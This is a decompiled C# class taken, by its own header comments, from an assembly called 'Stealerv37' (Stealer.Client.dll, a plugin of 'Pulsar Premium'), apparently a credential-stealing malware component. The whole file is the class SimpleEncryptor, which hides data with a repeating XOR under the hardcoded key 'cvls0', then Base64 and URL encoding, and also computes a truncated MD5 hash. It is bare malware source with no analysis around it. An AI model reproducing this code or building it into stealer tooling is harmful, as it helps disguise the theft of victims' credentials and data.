// Decompiled with JetBrains decompiler
// Type: CvMega.Helper.SimpleEncryptor
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Security.Cryptography;
using System.Text;
using System.Web;

#nullable disable
namespace CvMega.Helper;

public class SimpleEncryptor
{
  public static readonly string secretKey = "cvls0";

  public static string Encrypt(string data)
  {
    return HttpUtility.UrlEncode(Convert.ToBase64String(SimpleEncryptor.XorEncrypt(Encoding.UTF8.GetBytes(data))));
  }

  public static string EncryptNonEnc(string data)
  {
    return Convert.ToBase64String(SimpleEncryptor.XorEncrypt(Encoding.UTF8.GetBytes(data)));
  }

  public static string Decrypt(string data)
  {
    return Encoding.UTF8.GetString(SimpleEncryptor.XorEncrypt(Convert.FromBase64String(data)));
  }

  public static string Hash(string data)
  {
    using (MD5 md5 = MD5.Create())
    {
      byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(data));
      StringBuilder stringBuilder = new StringBuilder();
      foreach (byte num in hash)
        stringBuilder.Append(num.ToString("x2"));
      return HttpUtility.UrlEncode(stringBuilder.ToString().Substring(0, 10));
    }
  }

  public static byte[] XorEncryptMyKey(byte[] data, byte key)
  {
    byte[] numArray = new byte[data.Length];
    for (int index = 0; index < data.Length; ++index)
      numArray[index] = (byte) ((uint) data[index] ^ (uint) key);
    return numArray;
  }

  public static byte[] XorEncrypt(byte[] dataBytes)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(SimpleEncryptor.secretKey);
    for (int index = 0; index < dataBytes.Length; ++index)
      dataBytes[index] ^= bytes[index % bytes.Length];
    return dataBytes;
  }
}
